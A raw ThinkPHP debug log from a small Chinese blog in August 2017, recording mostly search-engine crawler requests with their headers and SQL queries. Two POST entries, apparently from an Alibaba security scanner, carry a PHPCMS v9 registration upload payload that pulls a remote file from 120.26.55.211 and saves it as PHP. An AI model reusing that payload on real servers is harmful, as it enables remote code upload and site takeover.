[ 2017-08-10T00:04:01+08:00 ] 172.17.180.47 111.206.36.18 GET /
[ log ] www.hhqblog.com/ [运行时间：0.036169s][吞吐率：27.65req/s] [内存消耗：5,930.41kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36',
  'host' => 'www.hhqblog.com',
  'connection' => 'close',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000307s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000832s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000968s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000437s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000469s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000347s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000350s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000369s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000891s ]

---------------------------------------------------------------
[ 2017-08-10T00:41:22+08:00 ] 172.17.180.47 140.205.201.36 POST /index.php?m=member&c=index&a=register&siteid=1
[ log ] hhqblog.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.032536s][吞吐率：30.74req/s] [内存消耗：5,990.52kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '171',
  'host' => 'hhqblog.com:80',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
)
[ info ] [ PARAM ] array (
  'm' => 'member',
  'c' => 'index',
  'a' => 'register',
  'siteid' => '1',
  'modelid' => '11',
  'username' => 'HqkEebJT',
  'password' => 'HqkEebJT',
  'email' => 'HqkEebJT@aliyun.com',
  'info' => 
  array (
    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
  ),
  'dosubmit' => '1',
  'protocol' => '',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000301s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000862s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000695s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000425s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000333s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001016s ]

---------------------------------------------------------------
[ 2017-08-10T00:41:23+08:00 ] 172.17.180.47 140.205.201.36 GET /index.php?m=wap&a=index&siteid=1
[ log ] hhqblog.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.031927s][吞吐率：31.32req/s] [内存消耗：5,989.41kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'hhqblog.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'm' => 'wap',
  'a' => 'index',
  'siteid' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000287s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000824s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000688s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000397s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000341s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000943s ]

---------------------------------------------------------------
[ 2017-08-10T00:57:50+08:00 ] 172.17.180.47 106.11.153.67 GET /ar/33.html
[ log ] hhqblog.com/ar/33.html [运行时间：0.029664s][吞吐率：33.71req/s] [内存消耗：4,367.73kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '33',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000311s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000834s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000671s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 33 LIMIT 1 [ RunTime:0.000253s ]

---------------------------------------------------------------
[ 2017-08-10T01:34:19+08:00 ] 172.17.180.47 220.181.108.179 GET /
[ log ] www.hhqblog.com/ [运行时间：0.035426s][吞吐率：28.23req/s] [内存消耗：5,931.12kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'accept-language' => 'zh-cn,zh-tw',
  'if-none-match' => '"@NULL@"',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000283s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000795s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000934s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000419s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000436s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000326s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000346s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000357s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000811s ]

---------------------------------------------------------------
[ 2017-08-10T01:34:30+08:00 ] 172.17.180.47 111.206.221.48 GET /index/index/index.html?page=1
[ log ] www.hhqblog.com/index/index/index.html?page=1 [运行时间：0.036784s][吞吐率：27.19req/s] [内存消耗：5,964.06kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
  'proxy-connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-devtools-emulate-network-conditions-client-id' => 'd27c8ebb-cb6c-4dd6-885a-df48e746b9a2',
  'x-requested-with' => 'XMLHttpRequest',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'resource-type' => '13',
  'referer' => 'http://www.hhqblog.com/',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000273s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000811s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000687s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000404s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000347s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000897s ]

---------------------------------------------------------------
[ 2017-08-10T01:38:32+08:00 ] 172.17.180.47 106.11.153.67 GET /index/index/index/cate_id/16.html
[ log ] www.hhqblog.com/index/index/index/cate_id/16.html [运行时间：0.032679s][吞吐率：30.60req/s] [内存消耗：5,988.98kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'www.hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'cate_id' => '16',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000286s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000830s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000689s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000408s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000344s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000965s ]

---------------------------------------------------------------
[ 2017-08-10T02:23:31+08:00 ] 172.17.180.47 106.11.153.67 GET /ar/22.html
[ log ] www.hhqblog.com/ar/22.html [运行时间：0.031092s][吞吐率：32.16req/s] [内存消耗：4,359.08kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'www.hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '22',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000315s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000851s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000706s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 22 LIMIT 1 [ RunTime:0.000263s ]

---------------------------------------------------------------
[ 2017-08-10T02:30:30+08:00 ] 172.17.180.47 106.11.153.67 GET /ar/44.html
[ log ] www.hhqblog.com/ar/44.html [运行时间：0.030370s][吞吐率：32.93req/s] [内存消耗：4,399.65kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'www.hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '44',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000326s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000814s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000744s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 44 LIMIT 1 [ RunTime:0.000280s ]

---------------------------------------------------------------
[ 2017-08-10T03:47:12+08:00 ] 172.17.180.47 140.205.225.194 POST /index.php?m=member&c=index&a=register&siteid=1
[ log ] hhqblog.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.036803s][吞吐率：27.17req/s] [内存消耗：5,932.88kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '171',
  'host' => 'hhqblog.com:80',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
)
[ info ] [ PARAM ] array (
  'm' => 'member',
  'c' => 'index',
  'a' => 'register',
  'siteid' => '1',
  'modelid' => '11',
  'username' => 'atgZzdBM',
  'password' => 'atgZzdBM',
  'email' => 'atgZzdBM@aliyun.com',
  'info' => 
  array (
    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
  ),
  'dosubmit' => '1',
  'protocol' => '',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000307s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000823s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000982s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000447s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000505s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000376s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000331s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000335s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000868s ]

---------------------------------------------------------------
[ 2017-08-10T03:47:14+08:00 ] 172.17.180.47 140.205.225.194 GET /index.php?m=wap&a=index&siteid=1
[ log ] hhqblog.com:80/index.php?m=wap&a=index&siteid=1 [运行时间：0.033639s][吞吐率：29.73req/s] [内存消耗：5,989.41kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => 'hhqblog.com:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-attachment-sql)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'm' => 'wap',
  'a' => 'index',
  'siteid' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000263s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000804s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000705s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000418s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000356s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001010s ]

---------------------------------------------------------------
[ 2017-08-10T04:36:02+08:00 ] 172.17.180.47 40.77.167.93 GET /misc/tags/
[ log ] hhqblog.com/misc/tags/ [运行时间：0.013264s][吞吐率：75.39req/s] [内存消耗：1,587.19kb] [文件加载：37]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'misc',
    1 => 'tags',
    2 => 'index.php',
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'pragma' => 'no-cache',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'from' => 'bingbot(at)microsoft.com',
  'host' => 'hhqblog.com',
  'user-agent' => 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T04:38:21+08:00 ] 172.17.180.47 5.255.250.29 GET /
[ log ] www.hhqblog.com/ [运行时间：0.032609s][吞吐率：30.67req/s] [内存消耗：5,988.81kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'from' => 'support@search.yandex.ru',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'ru, uk;q=0.8, be;q=0.8, en;q=0.7, *;q=0.01',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000290s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000814s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000669s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000399s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000330s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001006s ]

---------------------------------------------------------------
[ 2017-08-10T04:38:21+08:00 ] 172.17.180.47 77.88.5.71 GET /
